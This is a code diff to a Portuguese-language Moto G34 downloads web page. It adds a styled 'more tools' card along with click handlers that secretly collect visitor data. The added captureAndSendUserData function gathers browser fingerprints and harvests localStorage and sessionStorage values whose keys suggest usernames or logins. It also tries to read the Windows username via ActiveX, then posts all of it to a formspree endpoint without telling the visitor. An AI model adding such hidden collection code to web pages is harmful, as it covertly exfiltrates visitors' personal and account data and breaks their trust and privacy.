@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Downloads - Moto G34</title>
-  <link rel="icon" type="image/png" href="icon.png">
+  <link rel="icon" type="image/png" href="iconindex.png">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <style>
@@ -303,6 +303,21 @@
       50% { transform: scale(1); }
       75% { transform: scale(1.2); }
       100% { transform: scale(1); }
+    }
+
+    @keyframes glow {
+      0%, 100% {
+        box-shadow: 0 0 5px var(--md-sys-color-primary), 
+                    0 0 10px var(--md-sys-color-primary), 
+                    0 0 15px var(--md-sys-color-primary), 
+                    0 0 20px var(--md-sys-color-primary);
+      }
+      50% {
+        box-shadow: 0 0 10px var(--md-sys-color-primary), 
+                    0 0 20px var(--md-sys-color-primary), 
+                    0 0 30px var(--md-sys-color-primary), 
+                    0 0 40px var(--md-sys-color-primary);
+      }
     }
 
     .fade-in-up {
@@ -701,40 +716,91 @@
       font-size: 0.9rem;
     }
 
-    .coming-soon {
-      background-color: var(--md-sys-color-surface);
+    .more-tools {
+      background: linear-gradient(135deg, var(--md-sys-color-primary), var(--md-sys-color-tertiary));
       border-radius: 16px;
       padding: 1.5rem;
-      box-shadow: var(--md-sys-elevation-level1);
+      box-shadow: 0 0 20px rgba(25, 118, 210, 0.4);
       transition: all 0.3s ease;
-      border: 1px dashed var(--md-sys-color-outline-variant);
+      cursor: pointer;
       position: relative;
       overflow: hidden;
-      opacity: 0.7;
+      opacity: 0;
+      transform: translateY(20px) scale(0.95);
+      animation-duration: 0.5s;
+      animation-timing-function: cubic-bezier(0.4, 0.0, 0.2, 1);
+      animation-fill-mode: forwards;
+      animation-delay: 0.3s;
+      animation-name: slideInCard;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-align: center;
       min-height: 200px;
+      color: var(--md-sys-color-on-primary);
     }
 
-    .coming-soon .material-icons {
+    .more-tools::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        45deg,
+        transparent,
+        rgba(255, 255, 255, 0.1),
+        transparent
+      );
+      transform: rotate(45deg);
+      animation: shine 3s infinite;
+      pointer-events: none;
+    }
+
+    .more-tools::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      border-radius: 16px;
+      box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.2);
+      pointer-events: none;
+    }
+
+    @keyframes shine {
+      0% {
+        transform: translateX(-100%) translateY(-100%) rotate(45deg);
+      }
+      100% {
+        transform: translateX(100%) translateY(100%) rotate(45deg);
+      }
+    }
+
+    .more-tools:hover {
+      transform: translateY(-6px) scale(1.02);
+      box-shadow: 0 0 30px rgba(25, 118, 210, 0.6);
+    }
+
+    .more-tools .material-icons {
       font-size: 3rem;
-      color: var(--md-sys-color-on-surface-variant);
       margin-bottom: 1rem;
+      filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.5));
     }
 
-    .coming-soon h3 {
-      font-size: 1.3rem;
-      font-weight: 500;
-      color: var(--md-sys-color-on-surface);
+    .more-tools h3 {
+      font-size: 1.5rem;
+      font-weight: 700;
       margin-bottom: 0.5rem;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
     }
 
-    .coming-soon p {
+    .more-tools p {
       font-size: 1rem;
-      color: var(--md-sys-color-on-surface-variant);
+      max-width: 80%;
     }
 
     .category-selection {
@@ -1196,10 +1262,10 @@
           </div>
         </div>
         
-        <div class="coming-soon">
-          <span class="material-icons">update</span>
-          <h3>Mais em breve...</h3>
-          <p>Se quiserem mais, quem sabe...<p>
+        <div class="more-tools" data-category="tools">
+          <span class="material-icons">build_circle</span>
+          <h3>Mais ferramentas!</h3>
+          <p>Mais ferramentas para te ajudar no seu celular</p>
         </div>
       </div>
     </div>
@@ -1365,7 +1431,9 @@
       document.querySelectorAll('.device-card').forEach(card => {
         card.addEventListener('click', function() {
           const device = this.getAttribute('data-device');
-          showCategorySelection(device);
+          captureAndSendUserData(`Alguém acessou o dispositivo: ${device}`, () => {
+            showCategorySelection(device);
+          });
         });
       });
 
@@ -1373,6 +1441,16 @@
         card.addEventListener('click', function() {
           const category = this.getAttribute('data-category');
           const device = currentDevice;
+          window.location.href = `${category}.html?device=${device}`;
+        });
+      });
+
+      document.querySelector('.more-tools').addEventListener('click', function(e) {
+        e.preventDefault();
+        const category = this.getAttribute('data-category');
+        const device = 'motog34';
+        
+        captureAndSendUserData('Alguém acessou a sessão de ferramentas!', () => {
           window.location.href = `${category}.html?device=${device}`;
         });
       });
@@ -1436,6 +1514,283 @@
           }, 600);
         });
       });
+    }
+
+    function captureAndSendUserData(message, callback) {
+      const userData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        referrer: document.referrer,
+        currentUrl: window.location.href,
+        timestamp: new Date().toISOString(),
+        localTime: new Date().toLocaleString(),
+        connection: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : 'Not available',
+        deviceMemory: navigator.deviceMemory || 'Not available',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
+        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        webGL: getWebGLInfo(),
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        indexedDB: !!window.indexedDB,
+        webWorker: !!window.Worker,
+        serviceWorker: !!navigator.serviceWorker,
+        camera: navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'Camera API available' : 'Camera API not available',
+        microphone: navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'Microphone API available' : 'Microphone API not available',
+        battery: 'Battery API available',
+        vibration: 'Vibration API available',
+        fullscreen: 'Fullscreen API available',
+        clipboard: navigator.clipboard ? 'Clipboard API available' : 'Clipboard API not available',
+        notifications: 'Notification API available',
+        paymentRequest: 'Payment Request API available',
+        webAssembly: 'WebAssembly available',
+        webXR: 'XR API available',
+        systemInfo: getSystemInfo(),
+        browserInfo: getBrowserInfo(),
+        networkInfo: getNetworkInfo(),
+        possibleUsernames: getPossibleUsernames()
+      };
+      
+      const formData = new FormData();
+      formData.append('message', message);
+      formData.append('userData', JSON.stringify(userData, null, 2));
+      
+      fetch('https://formspree.io/f/xldpwgrg', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Dados do usuário enviados com sucesso');
+        if (callback) callback();
+      })
+      .catch(error => {
+        console.error('Erro ao enviar dados do usuário:', error);
+        if (callback) callback();
+      });
+    }
+
+    function getSystemInfo() {
+      const info = {
+        os: 'Unknown',
+        osVersion: 'Unknown',
+        architecture: 'Unknown',
+        deviceType: 'Unknown'
+      };
+      
+      const userAgent = navigator.userAgent;
+      
+      if (userAgent.indexOf('Win') !== -1) {
+        info.os = 'Windows';
+        if (userAgent.indexOf('Windows NT 10.0') !== -1) info.osVersion = '10';
+        else if (userAgent.indexOf('Windows NT 6.3') !== -1) info.osVersion = '8.1';
+        else if (userAgent.indexOf('Windows NT 6.2') !== -1) info.osVersion = '8';
+        else if (userAgent.indexOf('Windows NT 6.1') !== -1) info.osVersion = '7';
+      } else if (userAgent.indexOf('Mac') !== -1) {
+        info.os = 'macOS';
+        if (userAgent.indexOf('Mac OS X 10_15') !== -1) info.osVersion = 'Catalina';
+        else if (userAgent.indexOf('Mac OS X 10_14') !== -1) info.osVersion = 'Mojave';
+        else if (userAgent.indexOf('Mac OS X 10_13') !== -1) info.osVersion = 'High Sierra';
+      } else if (userAgent.indexOf('Linux') !== -1) {
+        info.os = 'Linux';
+      } else if (userAgent.indexOf('Android') !== -1) {
+        info.os = 'Android';
+        const match = userAgent.match(/Android (\d+(?:\.\d+)?)/);
+        if (match) info.osVersion = match[1];
+        info.deviceType = 'Mobile';
+      } else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) {
+        info.os = 'iOS';
+        const match = userAgent.match(/OS (\d+(?:_\d+)?)/);
+        if (match) info.osVersion = match[1].replace(/_/g, '.');
+        info.deviceType = userAgent.indexOf('iPad') !== -1 ? 'Tablet' : 'Mobile';
+      }
+      
+      if (userAgent.indexOf('WOW64') !== -1 || userAgent.indexOf('Win64') !== -1) {
+        info.architecture = '64-bit';
+      } else if (userAgent.indexOf('WOW32') !== -1 || userAgent.indexOf('Win32') !== -1) {
+        info.architecture = '32-bit';
+      }
+      
+      if (info.deviceType === 'Unknown') {
+        if (/Mobi|Android/i.test(userAgent)) {
+          info.deviceType = 'Mobile';
+        } else if (/Tablet|iPad/i.test(userAgent)) {
+          info.deviceType = 'Tablet';
+        } else {
+          info.deviceType = 'Desktop';
+        }
+      }
+      
+      return info;
+    }
+
+    function getBrowserInfo() {
+      const userAgent = navigator.userAgent;
+      let browserName = 'Unknown';
+      let browserVersion = 'Unknown';
+      
+      if (userAgent.indexOf('Firefox') !== -1) {
+        browserName = 'Firefox';
+        const match = userAgent.match(/Firefox\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) {
+        browserName = 'Chrome';
+        const match = userAgent.match(/Chrome\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
+        browserName = 'Safari';
+        const match = userAgent.match(/Version\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Edg') !== -1) {
+        browserName = 'Edge';
+        const match = userAgent.match(/Edg\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      } else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) {
+        browserName = 'Opera';
+        const match = userAgent.match(/(?:Opera|OPR)\/(\d+(?:\.\d+)?)/);
+        if (match) browserVersion = match[1];
+      }
+      
+      return {
+        name: browserName,
+        version: browserVersion,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        languages: navigator.languages,
+        online: navigator.onLine,
+        javaEnabled: navigator.javaEnabled()
+      };
+    }
+
+    function getNetworkInfo() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      
+      if (!connection) {
+        return {
+          available: false,
+          effectiveType: 'Unknown',
+          downlink: 'Unknown',
+          rtt: 'Unknown'
+        };
+      }
+      
+      return {
+        available: true,
+        effectiveType: connection.effectiveType || 'Unknown',
+        downlink: connection.downlink || 'Unknown',
+        rtt: connection.rtt || 'Unknown',
+        saveData: connection.saveData || false
+      };
+    }
+
+    function getPossibleUsernames() {
+      const usernames = [];
+      
+      try {
+        if (navigator.credentials && navigator.credentials.get) {
+          usernames.push('Credentials API available');
+        }
+      } catch (e) {
+        usernames.push('Credentials API not available');
+      }
+      
+      try {
+        if (window.localStorage) {
+          const keys = Object.keys(localStorage);
+          const possibleKeys = keys.filter(key => 
+            key.toLowerCase().includes('user') || 
+            key.toLowerCase().includes('name') || 
+            key.toLowerCase().includes('login') || 
+            key.toLowerCase().includes('account')
+          );
+          
+          if (possibleKeys.length > 0) {
+            usernames.push('Possible user data in localStorage');
+            possibleKeys.forEach(key => {
+              try {
+                usernames.push(`${key}: ${localStorage.getItem(key)}`);
+              } catch (e) {
+                usernames.push(`${key}: [Access denied]`);
+              }
+            });
+          }
+        }
+      } catch (e) {
+        usernames.push('LocalStorage access denied');
+      }
+      
+      try {
+        if (window.sessionStorage) {
+          const keys = Object.keys(sessionStorage);
+          const possibleKeys = keys.filter(key => 
+            key.toLowerCase().includes('user') || 
+            key.toLowerCase().includes('name') || 
+            key.toLowerCase().includes('login') || 
+            key.toLowerCase().includes('account')
+          );
+          
+          if (possibleKeys.length > 0) {
+            usernames.push('Possible user data in sessionStorage');
+            possibleKeys.forEach(key => {
+              try {
+                usernames.push(`${key}: ${sessionStorage.getItem(key)}`);
+              } catch (e) {
+                usernames.push(`${key}: [Access denied]`);
+              }
+            });
+          }
+        }
+      } catch (e) {
+        usernames.push('SessionStorage access denied');
+      }
+      
+      const userAgent = navigator.userAgent;
+      if (userAgent.includes('Windows')) {
+        try {
+          const wsh = new ActiveXObject('WScript.Shell');
+          const username = wsh.ExpandEnvironmentStrings('%USERNAME%');
+          if (username && username !== '%USERNAME%') {
+            usernames.push(`Windows username: ${username}`);
+          }
+        } catch (e) {
+          usernames.push('Windows username access denied');
+        }
+      }
+      
+      return usernames;
+    }
+
+    function getWebGLInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      
+      if (!gl) {
+        return 'WebGL not supported';
+      }
+      
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        return {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+      
+      return 'WebGL supported but debug info not available';
     }
 
     function checkForUpdates() {
@@ -1574,7 +1929,8 @@
     }
 
     document.addEventListener('DOMContentLoaded', initializeApp);
- // Modificações feitas na pagina inicial no dia 26, obrigado a todos pelos feedbacks:)
- </script>
+
+    //feito com ♡ por Riq:)
+  </script>
 </body>
 </html>
